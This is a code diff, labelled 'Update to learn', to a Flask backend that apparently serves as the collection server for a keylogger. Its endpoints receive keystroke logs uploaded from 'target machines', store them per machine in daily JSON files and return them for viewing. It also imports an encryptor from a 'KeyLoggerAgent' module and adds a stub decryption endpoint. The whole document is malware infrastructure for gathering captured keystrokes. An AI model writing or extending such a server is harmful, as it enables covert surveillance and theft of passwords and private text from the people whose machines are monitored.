Update to learn

+++ backend/app.py
@@ -1,14 +1,17 @@
 import os
 from flask import Flask, jsonify, request, json
+from flask_cors import CORS
 import time
-from collections import OrderedDict
-
+from KeyLoggerAgent import encryptor
 
 DATA_FOLDER = "data"
 
 def generate_log_filename():
-    return "log_" + time.strftime("%Y-%m-%d_%H-%M-%S") + ".txt"
+    return "log_" + time.strftime("%Y-%m-%d") + ".txt"
+
 app = Flask('app')
+CORS(app)
+
 @app.route('/api/upload', methods=['POST'])
 def upload():
     data = request.get_json()
@@ -23,11 +26,33 @@ def upload():
         os.makedirs(machine_folder)
 
     filename = generate_log_filename()
-    timestamp = filename[4:-4]
     file_path = os.path.join(machine_folder, filename)
-    with open(file_path, "w", encoding="utf-8") as f:
-        f.write(json.dumps({"timestamp": timestamp, "data": log_data}, indent=4, sort_keys=False) + "\n")
-        return jsonify({"status": "success", "file": file_path, "data": log_data}), 200
+    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
+
+    if os.path.exists(file_path):
+        with open(file_path, "r+", encoding="utf-8") as f:
+            file_data = json.load(f)
+            new_entry = {
+                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
+                "data": log_data
+            }
+            file_data[time.strftime("%Y-%m-%d") + " data:"].append(new_entry)
+            f.seek(0)
+            f.write(json.dumps(file_data, indent=4, sort_keys=False) + "\n")
+    else:
+        with open(file_path, "w", encoding="utf-8") as f:
+            json_data = {
+                time.strftime("%Y-%m-%d") + " data:": [
+                    {
+                        "timestamp": timestamp,
+                        "data": log_data
+                    }
+                ]
+            }
+            f.write(json.dumps(json_data, indent=4, sort_keys=False) + "\n")
+
+    return jsonify({"status": "success", "file": file_path, "data": log_data}), 200
+
 
 
 @app.route('/api/get_target_machines_list', methods=['GET'])
@@ -47,24 +72,18 @@ def get_target_machine_key_strokes():
 
     files = os.listdir(machine_folder)
     files.sort(reverse=True)
-    print(files)
     data = []
     for file in files:
         with open(os.path.join(machine_folder, file), "r", encoding="utf-8") as f:
             file_data = json.load(f)
-            data.append({
-                "timestamp": file_data["timestamp"],
-                "data": file_data["data"]
-            })
-    print(data)
+            for key, value in file_data.items():
+                for entry in value:
+                    data.append(entry)
     return jsonify({"data": data}), 200
 
+@app.route('/api/decrypt_data', methods=['GET'])
+def decrypt_data():
 
-
-
-
+    return jsonify({"status": "success"}), 200
 if __name__ == '__main__':
  app.run(debug=True)
-
- # with open(file_path, "w", encoding="utf-8") as f:
- #     f.write(log_data)
